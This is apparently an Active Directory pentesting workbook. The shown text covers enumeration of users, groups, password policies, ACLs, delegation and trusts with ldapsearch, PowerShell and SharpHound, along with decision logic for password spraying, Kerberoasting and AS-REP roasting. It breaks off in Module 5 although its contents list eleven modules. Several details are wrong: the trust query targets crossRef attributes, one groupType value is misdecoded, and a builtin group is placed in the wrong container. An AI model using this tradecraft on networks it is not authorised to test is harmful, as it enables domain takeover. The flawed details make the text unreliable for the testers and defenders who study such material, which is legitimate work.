# 🧠 Active Directory Pentesting Workbook

---

## Table of Contents

1. [Module 1: Introduction to Active Directory](#module-1)
2. [Module 2: Enumerating Users, Groups & Privileged Accounts](#module-2)
3. [Module 3: Reviewing Domain Password Policies & Attack Opportunities](#module-3)
4. [Module 4: Identifying Built-In Groups & Default Security Settings](#module-4)
5. [Module 5: Enumerating Computers, SPN Delegation & Trust Relationships](#module-5)
6. [Module 6: ACL Misconfiguration Deep Dive & Shadow Admin Discovery](#module-6)
7. [Module 7: Kerberoasting & AS-REP Roasting Attacks](#module-7)
8. [Module 8: AD Certificate Services Enumeration & Abuses](#module-8)
9. [Module 9: DCSync, DCShadow & Advanced Credential Theft](#module-9)
10. [Module 10: Lateral Movement & Privilege Escalation](#module-10)
11. [Module 11: Persistence & Cleanup](#module-11)
12. [Roadmap Summary](#roadmap)

---

## <a name="module-1"></a> Module 1: Introduction to Active Directory

*(If you’re already familiar with AD basics—domains, forests, DCs, LDAP, Kerberos, DNs, CNs, DCs—feel free to skip to Module 2.)*

### Introduction  
Active Directory (AD) is Microsoft’s directory service—a centralized database and collection of services that manage users, computers, and resources in a Windows network. If a company is the “kingdom,” then Active Directory is the “grand library” containing everything about citizens (users), “castles” (servers), “royal decrees” (policies), and “keystones” (credentials). For pentesters, understanding AD is critical because most enterprise-level Windows environments rely on it entirely.

### Definitions  
1. **Directory Service**  
   - A system that stores information about objects (users, computers, printers, etc.) in a network and allows querying and management of that information.  

2. **Domain**  
   - A logical grouping of objects that share a common AD database and security policies.  

3. **Domain Controller (DC)**  
   - A server that holds a writable copy of the AD database and responds to authentication requests.  

4. **Forest**  
   - A collection of one or more domains that share a common schema and global catalog.  

5. **Organizational Unit (OU)**  
   - A container within a domain used to organize objects hierarchically.  

6. **Lightweight Directory Access Protocol (LDAP)**  
   - A protocol to query and modify directory services like AD.  

7. **Global Catalog (GC)**  
   - A DC that holds a partial replica of all objects in the forest for fast searches.  

8. **Kerberos**  
   - The primary authentication protocol in AD.  

9. **Distinguished Name (DN)**  
   - The unique path of an object in AD. Format:  
     ```
     CN=UserName,OU=OrgUnit,DC=domain,DC=tld
     ```  

10. **Common Name (CN)**  
    - The attribute in AD that typically holds a display name.  
11. **Domain Component (DC)**  
    - Each segment of the domain name in a DN.  

### Why It Matters  
- Over 90% of large organizations run Windows and rely on AD for authentication and authorization.  
- A successful pentest almost always involves pivoting through AD—finding weak passwords, abusing misconfigured groups, and elevating to Domain Admin.  

### Tools & Commands  

#### Built-In Windows Commands  
- `dsquery` (legacy):  
  ```
  dsquery user -name *
  dsquery group -name "Domain Admins"
  ```  
- `net user`:  
  ```
  net user <username> /domain
  ```  
- `net group`:  
  ```
  net group "Domain Admins" /domain
  ```  
- `whoami`:  
  ```
  whoami
  whoami /groups
  ```

#### PowerShell (AD Module)  
- Import AD module:  
  ```powershell
  Import-Module ActiveDirectory
  ```  
- Get domain information:  
  ```powershell
  Get-ADDomain
  Get-ADForest
  ```  
- List AD users:  
  ```powershell
  Get-ADUser -Filter * | Select Name
  ```

#### LDAP Queries (ldapsearch)  
- Find defaultNamingContext:  
  ```bash
  ldapsearch -x -H ldap://<DC_IP> -s base -b "" "(objectClass=*)" defaultNamingContext
  ```  
- List all users:  
  ```bash
  ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName,distinguishedName
  ```  
- List all groups:  
  ```bash
  ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName
  ```  

### Step-by-Step Guide  

#### 1. Verify Domain-Joined Machine  
- Check domain:  
  ```bat
  echo %USERDOMAIN%
  ```  
- Check logon server:  
  ```bat
  echo %LOGONSERVER%
  ```  
- PowerShell:  
  ```powershell
  whoami
  whoami /groups
  ```

#### 2. Discover FQDN via DNS  
- Run nslookup:  
  ```bat
  nslookup corp
  ```  
- PowerShell:  
  ```powershell
  Get-ADDomain | Select-Object DNSRoot, NetBIOSName
  ```

#### 3. Enumerate Domain Controllers  
- `nltest`:  
  ```bat
  nltest /dclist:CORP
  ```  
- PowerShell:  
  ```powershell
  Get-ADDomainController -Filter * | Select HostName,IPv4Address
  ```  
- LDAP:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=domainController)" name,distinguishedName
  ```

#### 4. Verify Reachability  
- Ping:  
  ```bat
  ping DC01.corp.local
  ```  
- SMB share:  
  ```bat
  net view \\DC01.corp.local
  ```  

#### 5. Retrieve Default Naming Context  
- RootDSE query:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -s base -b "" "(objectClass=*)" defaultNamingContext
  ```

### Common Pitfalls  
- Confusing NetBIOS vs. FQDN  
- Wrong Base DN  
- SMB blocked by firewall  
- Assuming only one DC  

### Next Steps  
- **Module 2**: Enumerating Users, Groups & Privileged Accounts  
- **Module 3**: Reviewing Domain Password Policies & Attack Opportunities  
- **Module 4**: Built-In Groups & Default Security Settings  

---

## <a name="module-2"></a> Module 2: Enumerating Users, Groups & Privileged Accounts

### Introduction  
Learn to list all users, identify privileged users (`adminCount=1`), find AS-REP roastable, service accounts, disabled users, and enumerate groups.

### Definitions  
1. **sAMAccountName**: Pre-Windows 2000 username.  
2. **userAccountControl**: Bitmask controlling account properties (enabled, disabled, preauth, etc.).  
3. **adminCount**: Indicates protected accounts in privileged groups.  
4. **Service Principal Name (SPN)**: Identifier for a service instance.  
5. **AS-REP Roasting**: Attacking accounts with `DONT_REQUIRE_PREAUTH`.  
6. **Disabled Account**: `ACCOUNTDISABLE` flag in `userAccountControl`.  
7. **Fine-Grained Password Policy (FGPP)**: PSOs for specific users/groups.  
8. **Global / Domain Local / Universal Groups**: Scope of groups.  
9. **groupType**: Bitmask indicating group scope and security.  

### Why It Matters  
- Privileged users lead to early domain compromise.  
- Service accounts can be Kerberoasted.  
- AS-REP roastable accounts can be cracked offline.  

### Tools & Commands  

#### LDAP Queries  
- All users:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName,userAccountControl,adminCount,distinguishedName
  ```  
- Privileged users:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName,memberOf,adminCount
  ```  
- AS-REP roastable:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName,userAccountControl
  ```  
- Service accounts (SPNs):  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
  ```  
- Disabled users:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName,userAccountControl,memberOf,whenChanged
  ```  
- All groups:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
  ```  
- Members of “Domain Admins”:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
  ```  
- Recursive group membership:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=jdoe,CN=Users,DC=corp,DC=local))" cn,distinguishedName
  ```  

#### PowerShell  
- List all users:  
  ```powershell
  Get-ADUser -Filter * -Properties sAMAccountName,memberOf
  ```  
- List all groups:  
  ```powershell
  Get-ADGroup -Filter * | Select Name
  ```  
- Get privileged users:  
  ```powershell
  Get-ADUser -Filter {adminCount -eq 1} -Properties memberOf
  ```  
- Get SPN accounts:  
  ```powershell
  Get-ADUser -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName
  ```  
- Get disabled users:  
  ```powershell
  Get-ADUser -Filter {Enabled -eq $false} -Properties memberOf,whenChanged
  ```  

### Decoding userAccountControl  
| Flag Name                         | Value | Purpose                         |
|-----------------------------------|-------|---------------------------------|
| NORMAL_ACCOUNT (512)              | 512   | Normal, enabled user            |
| ACCOUNTDISABLE (2)                | 2     | Account is disabled             |
| DONT_EXPIRE_PASSWORD (65536)      | 65536 | Password never expires          |
| DONT_REQUIRE_PREAUTH (4194304)    | 4194304 | AS-REP Roastable              |

### Step-by-Step Guide  

#### 1. Enumerate All Users  

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName,userAccountControl,adminCount,distinguishedName
```

**Expected Output (partial)**:  
```
dn: CN=Administrator,CN=Users,DC=corp,DC=local
sAMAccountName: Administrator
userAccountControl: 512
adminCount: 1

dn: CN=jdoe,CN=Users,DC=corp,DC=local
sAMAccountName: jdoe
userAccountControl: 512
adminCount: 0

dn: CN=svc_sql,CN=Users,DC=corp,DC=local
sAMAccountName: svc_sql
userAccountControl: 66048
adminCount: 0

dn: CN=svc_legacy,CN=Users,DC=corp,DC=local
sAMAccountName: svc_legacy
userAccountControl: 4260352
adminCount: 0
```

- `Administrator`: Normal (512) + Protected (adminCount=1).  
- `jdoe`: Normal user.  
- `svc_sql`: Service account (66048 = Normal + PwdNeverExpires).  
- `svc_legacy`: Service account + DONT_REQUIRE_PREAUTH.

#### 2. Privileged Users (`adminCount=1`)

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName,memberOf
```

**Expected Output**:  
```
dn: CN=Administrator,CN=Users,DC=corp,DC=local
sAMAccountName: Administrator
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local

dn: CN=jsmith,CN=Users,DC=corp,DC=local
sAMAccountName: jsmith
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local

dn: CN=svc_backup,CN=Users,DC=corp,DC=local
sAMAccountName: svc_backup
memberOf: CN=Backup Operators,CN=Users,DC=corp,DC=local
```

#### 3. AS-REP Roastable Accounts

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName,userAccountControl
```

**Expected Output**:  
```
dn: CN=svc_legacy,CN=Users,DC=corp,DC=local
sAMAccountName: svc_legacy
userAccountControl: 4260352

dn: CN=svc_oldjr,CN=Users,DC=corp,DC=local
sAMAccountName: svc_oldjr
userAccountControl: 4194304
```

#### 4. Service Accounts with SPNs

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
```

**Expected Output**:  
```
dn: CN=svc_sql,CN=Users,DC=corp,DC=local
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/sqlsrv.corp.local:1433

dn: CN=svc_ftp,CN=Users,DC=corp,DC=local
sAMAccountName: svc_ftp
servicePrincipalName: ftp/corp.local
```

#### 5. Disabled Users

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName,userAccountControl,memberOf,whenChanged
```

**Expected Output**:  
```
dn: CN=test_user,CN=Users,DC=corp,DC=local
sAMAccountName: test_user
userAccountControl: 514
memberOf: CN=IT-Helpdesk,CN=Users,DC=corp,DC=local
whenChanged: 20250210123045.0Z

dn: CN=svc_oldsvc,CN=Users,DC=corp,DC=local
sAMAccountName: svc_oldsvc
userAccountControl: 66050
memberOf: CN=Backup Operators,CN=Users,DC=corp,DC=local
whenChanged: 20240104101530.0Z
```

#### 6. Enumerate All Groups

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
```

**Expected Output**:  
```
dn: CN=Domain Users,CN=Users,DC=corp,DC=local
cn: Domain Users
groupType: -2147483646

dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
cn: Domain Admins
groupType: -2147483646

dn: CN=Backup Operators,CN=Users,DC=corp,DC=local
cn: Backup Operators
groupType: -2147483646

dn: CN=IT-Helpdesk,CN=Users,DC=corp,DC=local
cn: IT-Helpdesk
groupType: -2147483648

dn: CN=CORP_Admins,OU=Groups,DC=corp,DC=local
cn: CORP_Admins
groupType: -2147483644
```

#### 7. Decode groupType Values  
- `-2147483646` (0x80000002) = Global Security Group  
- `-2147483648` (0x80000000) = Global Security Group  
- `-2147483644` (0x80000004) = Universal Security Group  

#### 8. Enumerate Members of “Domain Admins”

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
```

**Expected Output**:  
```
dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
member: CN=Administrator,CN=Users,DC=corp,DC=local
member: CN=jsmith,CN=Users,DC=corp,DC=local
member: CN=svc_backup,CN=Users,DC=corp,DC=local
```

#### 9. Recursive Group Membership

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=helpdesk,CN=Users,DC=corp,DC=local))" cn,distinguishedName
```

**Expected Output**:  
```
dn: CN=Admins,OU=Groups,DC=corp,DC=local
cn: Admins

dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
cn: Domain Admins
```

### Common Pitfalls  
- Misreading `userAccountControl` flags  
- Forgetting `objectCategory=person` when filtering users  
- Ignoring FGPP overrides  
- Overlooking nested group membership  

### Next Steps  
- **Module 3**: Reviewing Domain Password Policies & Attack Opportunities  
- **Module 4**: Identifying Built-In Groups & Default Security Settings  

---

## <a name="module-3"></a> Module 3: Reviewing Domain Password Policies & Attack Opportunities

### Introduction  
Learn to evaluate default domain policy and FGPP (PSOs) to decide whether to use password spraying, brute-forcing, Kerberoasting, or AS-REP roasting.

### Definitions  
1. **Password Policy**: Rules for password complexity, length, expiration.  
2. **Group Policy Object (GPO)**: Collection of policies applied to users/computers.  
3. **Fine-Grained Password Policy (FGPP / PSO)**: Password settings applied to specific users or groups.  
4. **Lockout Threshold**: Number of failed attempts before lockout.  
5. **Password History Count**: Number of previous passwords remembered.  

### Why It Matters  
- Weak policies = password spraying or brute-forcing can succeed.  
- Strong policies = pivot to Kerberoast or AS-REP roast.

### Tools & Commands  

#### Command Prompt  
- Default policy:  
  ```bat
  net accounts /domain
  ```

#### PowerShell  
- Default policy:  
  ```powershell
  Get-ADDefaultDomainPasswordPolicy | Format-List *
  ```  
- FGPP:  
  ```powershell
  Get-ADFineGrainedPasswordPolicy | Format-List Name,msDS-MinimumPasswordLength,msDS-LockoutThreshold,msDS-PasswordHistoryLength,msDS-PasswordSettingsPrecedence
  ```

#### LDAP Queries  
- Find PSOs:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" "(objectClass=msDS-PasswordSettings)" msDS-MinimumPasswordLength,msDS-LockoutThreshold,msDS-PasswordHistoryLength,msDS-PasswordSettingsPrecedence,msDS-PSOAppliesTo
  ```

### Step-by-Step Guide  

#### 1. Check Default Domain Policy  

```bat
net accounts /domain
```

**Expected Output**:  
```
Minimum password length: 7
Lockout threshold: 5
Lockout duration: 30 minutes
Maximum password age: 90 days
Minimum password age: 1 day
```

#### 2. PowerShell Default Policy  

```powershell
Get-ADDefaultDomainPasswordPolicy | Format-List *
```

**Expected Output**:  
```
ComplexityEnabled: True
MinPasswordLength : 7
LockoutThreshold : 5
PasswordHistoryCount: 24
...
```

#### 3. Enumerate FGPP (PSOs)  

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" "(objectClass=msDS-PasswordSettings)" msDS-MinimumPasswordLength,msDS-LockoutThreshold,msDS-PasswordHistoryLength,msDS-PasswordSettingsPrecedence,msDS-PSOAppliesTo
```

**Expected Output**:  
```
dn: CN=StrictAdminsPSO,CN=Password Settings Container,CN=System,DC=corp,DC=local
msDS-MinimumPasswordLength: 14
msDS-LockoutThreshold: 3
msDS-PasswordHistoryLength: 50
msDS-PasswordSettingsPrecedence: 1
msDS-PSOAppliesTo: CN=Domain Admins,CN=Users,DC=corp,DC=local

dn: CN=LegacySvcPSO,CN=Password Settings Container,CN=System,DC=corp,DC=local
msDS-MinimumPasswordLength: 12
msDS-LockoutThreshold: 0
msDS-PasswordHistoryLength: 0
msDS-PasswordSettingsPrecedence: 2
msDS-PSOAppliesTo: CN=ServiceAccounts,OU=Groups,DC=corp,DC=local
```

### Attack Decision Logic  
- **MinLength ≤ 7 & Complexity = False**: Password spraying.  
- **Strong Policy** (MinLength ≥ 14): Skip brute-forcing users; target Kerberoast/AS-REP.  
- **PSO for DAs**: If StrictAdminsPSO applies to DAs, do not spray DAs; focus on service accounts.

### Common Pitfalls  
- `net accounts /domain` hides PSOs.  
- Overlooking `Password Never Expires`.  
- Ignoring `LockoutThreshold` when spraying.

### Next Steps  
- **Module 4**: Identifying Built-In Groups & Default Security Settings  

---

## <a name="module-4"></a> Module 4: Identifying Built-In Groups & Default Security Settings

### Introduction  
Enumerate all groups, decode their `groupType`, identify built-in and custom high-priv groups, and examine ACLs for shadow admin paths.

### Definitions  
1. **groupType**: Bitmask for group scope (Global, Universal, Domain Local) and security.  
2. **Security Group vs. Distribution Group**: Security groups assign permissions; distribution do not.  
3. **Built-In Groups**: Default AD groups under `CN=Builtin,DC=corp,DC=local`.  
4. **ACL (Access Control List)**: List of ACEs granting/denying rights to principals.  
5. **ACE (Access Control Entry)**: Single entry specifying principal, rights (e.g., `GenericAll`, `WriteDACL`), and inheritance.  
6. **GenericAll**: Full control over an object.  
7. **GenericWrite**: Write properties on object.  
8. **WriteDACL**: Modify the ACL itself.  
9. **Shadow Admins**: Accounts/groups not in DA but with rights leading to DA.

### Why It Matters  
- High-priv groups (DA, EA) obvious. Custom or built-in groups (Backup Operators, Account Operators) also powerful.  
- ACL misconfigs let low-priv users escalate without credentials.

### Tools & Commands  

#### LDAP Queries  
- All groups:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
  ```  
- Built-In groups:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName
  ```  
- Members of “Domain Admins”:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
  ```  
- Recursive membership:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=<DN>))" cn,member
  ```

#### PowerShell  
- List groups with scope:  
  ```powershell
  Get-ADGroup -Filter * | Select Name,GroupScope,GroupCategory
  ```  
- Built-In groups:  
  ```powershell
  Get-ADGroup -SearchBase "CN=Builtin,DC=corp,DC=local" -Filter * | Select Name
  ```  
- Recursive members:  
  ```powershell
  Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select Name,sAMAccountName,objectClass
  ```  
- ACL on OU:  
  ```powershell
  $acl = Get-Acl "AD:OU=Admins,DC=corp,DC=local"
  $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" -or $_.ActiveDirectoryRights -match "WriteDacl" }
  ```

#### BloodHound  
- Collect data:  
  ```powershell
  Invoke-SharpHound -CollectionMethod ACL,Group,Session,LocalAdmin
  ```  
- Visualize: Load JSON into BloodHound GUI and run “Find Shortest Paths to Domain Admins”.

### Step-by-Step Guide  

#### 1. Enumerate All Groups & Decode `groupType`

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
```

**Expected Output (partial)**:  
```
dn: CN=Domain Users,CN=Users,DC=corp,DC=local
cn: Domain Users
groupType: -2147483646

dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
cn: Domain Admins
groupType: -2147483646

dn: CN=Backup Operators,CN=Users,DC=corp,DC=local
cn: Backup Operators
groupType: -2147483646

dn: CN=IT-Helpdesk,CN=Users,DC=corp,DC=local
cn: IT-Helpdesk
groupType: -2147483648

dn: CN=CORP_Admins,OU=Groups,DC=corp,DC=local
cn: CORP_Admins
groupType: -2147483644
```

- `-2147483646` (0x80000002): Global Security Group  
- `-2147483648` (0x80000000): Global Security Group  
- `-2147483644` (0x80000004): Universal Security Group  

#### 2. Enumerate Built-In Groups

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName
```

**Expected Output**:  
```
dn: CN=Administrators,CN=Builtin,DC=corp,DC=local
cn: Administrators

dn: CN=Users,CN=Builtin,DC=corp,DC=local
cn: Users

dn: CN=Guests,CN=Builtin,DC=corp,DC=local
cn: Guests

dn: CN=Account Operators,CN=Builtin,DC=corp,DC=local
cn: Account Operators

dn: CN=Backup Operators,CN=Builtin,DC=corp,DC=local
cn: Backup Operators

dn: CN=Server Operators,CN=Builtin,DC=corp,DC=local
cn: Server Operators

dn: CN=Print Operators,CN=Builtin,DC=corp,DC=local
cn: Print Operators
```

#### 3. Enumerate Members of High-Privilege Groups

- Domain Admins:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
  ```

- Enterprise Admins:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Enterprise Admins))" member
  ```

- Account Operators:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" "(&(objectCategory=group)(cn=Account Operators))" member
  ```

#### 4. Recursive Group Membership

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=helpdesk,CN=Users,DC=corp,DC=local))" cn,distinguishedName,member
```

**Expected Output**:  
```
dn: CN=Admins,OU=Groups,DC=corp,DC=local
cn: Admins
member: CN=helpdesk,CN=Users,DC=corp,DC=local

dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
cn: Domain Admins
member: CN=Admins,OU=Groups,DC=corp,DC=local
member: CN=jsmith,CN=Users,DC=corp,DC=local
```

#### 5. Check ACLs on Users OU

```powershell
$aclUsers = Get-Acl "AD:CN=Users,DC=corp,DC=local"
$aclUsers.Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" -or $_.ActiveDirectoryRights -match "WriteDacl" } | Select-Object IdentityReference,ActiveDirectoryRights,ObjectType,InheritanceType
```

**Expected Output**:  
```
IdentityReference          ActiveDirectoryRights   ObjectType                               InheritanceType
-----------------          ---------------------   ----------                               ---------------
CORP\AuditGroup            WriteDacl               bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
CORP\Domain Admins         GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
BUILTIN\Administrators     GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
```

- “AuditGroup” has WriteDacl on Users OU → shadow admin.

### Common Pitfalls  
- Misinterpreting `groupType` bits  
- Overlooking ACL inheritance  
- Ignoring built-in groups in `CN=Builtin`

### Next Steps  
- **Module 5**: Enumerating Computers, SPN Delegation & Trust Relationships  

---

## <a name="module-5"></a> Module 5: Enumerating Computers, SPN Delegation & Trust Relationships

### Introduction  
Find computer accounts, identify SPN delegation (Kerberoast, unconstrained, constrained, RBCD), and map trust relationships.

### Definitions  
1. **Computer Account**: AD object for a host; `sAMAccountName` ends with `$`.  
2. **SPN Delegation**:  
   - **Kerberoasting**: Obtain TGS for SPN encrypted with account password.  
   - **Unconstrained Delegation**: `TRUSTED_FOR_DELEGATION` bit in `userAccountControl`.  
   - **Constrained Delegation**: `msDS-AllowedToDelegateTo` attribute.  
   - **RBCD**: `msDS-AllowedToActOnBehalfOfOtherIdentity`.  
3. **Trust Relationship**: Link between domains; one-way or two-way.

### Why It Matters  
- SPNs yield offline cracking.  
- Unconstrained delegation allows impersonation.  
- Trusts can open the entire forest.

### Tools & Commands  

#### LDAP Queries  
- All computers:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=computer)" sAMAccountName,operatingSystem,distinguishedName,servicePrincipalName,userAccountControl
  ```  
- SPN hosts:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
  ```  
- Unconstrained delegation:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName,distinguishedName,userAccountControl
  ```  
- Constrained delegation:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" sAMAccountName,msDS-AllowedToDelegateTo
  ```  
- Trust relationships:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectClass=crossRef)" nETBIOSName,dnsRoot,trustPartner,trustDirection
  ```

#### PowerShell  
- All computers:  
  ```powershell
  Get-ADComputer -Filter * -Properties operatingSystem,servicePrincipalName,userAccountControl
  ```  
- SPN hosts:  
  ```powershell
  Get-ADComputer -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName
  ```  
- Unconstrained delegation:  
  ```powershell
  Get-ADComputer -Filter {userAccountControl -band 524288} -Properties userAccountControl
  ```  
- Constrained delegation:  
  ```powershell
  Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
  ```  
- Trust relationships:  
  ```powershell
  Get-ADTrust -Filter * | Select Name,TrustType,Direction,Target
  ```

### Step-by-Step Guide  

#### 1. Enumerate All Computers  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=computer)" sAMAccountName,operatingSystem,distinguishedName,servicePrincipalName,userAccountControl
```
**Expected Output (partial)**:  
```
dn: CN=DC01,CN=Computers,DC=corp,DC=local
sAMAccountName: DC01$
operatingSystem: Windows Server 2022 Datacenter
servicePrincipalName: GC/DC01.corp.local
userAccountControl: 532480

dn: CN=WS001,OU=Workstations,DC=corp,DC=local
sAMAccountName: WS001$
operatingSystem: Windows 10 Pro
userAccountControl: 4096

dn: CN=SRV-FS01,OU=FileServers,DC=corp,DC=local
sAMAccountName: SRV-FS01$
operatingSystem: Windows Server 2019 Standard
userAccountControl: 528704
```

#### 2. Identify Kerberoastable Hosts (SPNs)  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
```
**Expected Output**:  
```
dn: CN=SRV-SQL01,OU=Servers,DC=corp,DC=local
sAMAccountName: SRV-SQL01$
servicePrincipalName: MSSQLSvc/sqlsrv.corp.local:1433

dn: CN=SRV-SQL02,OU=Servers,DC=corp,DC=local
sAMAccountName: SRV-SQL02$
servicePrincipalName: MSSQLSvc/sql02.corp.local:1433, MSSQLSvc/sql02.corp.local

dn: CN=SRV-EX01,OU=MailServers,DC=corp,DC=local
sAMAccountName: SRV-EX01$
servicePrincipalName: SMTP/ex01.corp.local
```

#### 3. Identify Unconstrained Delegation Hosts  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName,distinguishedName,userAccountControl
```
**Expected Output**:  
```
dn: CN=DC01,CN=Computers,DC=corp,DC=local
sAMAccountName: DC01$
userAccountControl: 532480

dn: CN=SRV-FS01,OU=FileServers,DC=corp,DC=local
sAMAccountName: SRV-FS01$
userAccountControl: 528704
```

#### 4. Identify Constrained Delegation Hosts  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" sAMAccountName,msDS-AllowedToDelegateTo
```
**Expected Output**:  
```
dn: CN=SRV-WEB01,OU=WebServers,DC=corp,DC=local
sAMAccountName: SRV-WEB01$
msDS-AllowedToDelegateTo: HTTP/sqlsrv.corp.local

dn: CN=SRV-APP01,OU=AppServers,DC=corp,DC=local
sAMAccountName: SRV-APP01$
msDS-AllowedToDelegateTo: MSSQLSvc/sql02.corp.local:1433
```

#### 5. Enumerate Trust Relationships  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectClass=crossRef)" nETBIOSName,dnsRoot,trustPartner,trustDirection
```
**Expected Output**:  
```
dn: CN=SALES,DC=Configuration,DC=corp,DC=local
nETBIOSName: SALES
dnsRoot: sales.corp.local
trustPartner: CORP.corp.local
trustDirection: 3

dn: CN=DEV,DC=Configuration,DC=corp,DC=local
nETBIOSName: DEV
dnsRoot: dev.corp.local
trustPartner: CORP.corp.local
trustDirection: 2
```

### Scenarios & Branching Logic  

#### Scenario 1: Domain User  
- Find SPN hosts → Kerberoast → crack → pivot.  
- If no SPNs, find unconstrained delegation hosts → gain local access → impersonate DA.  

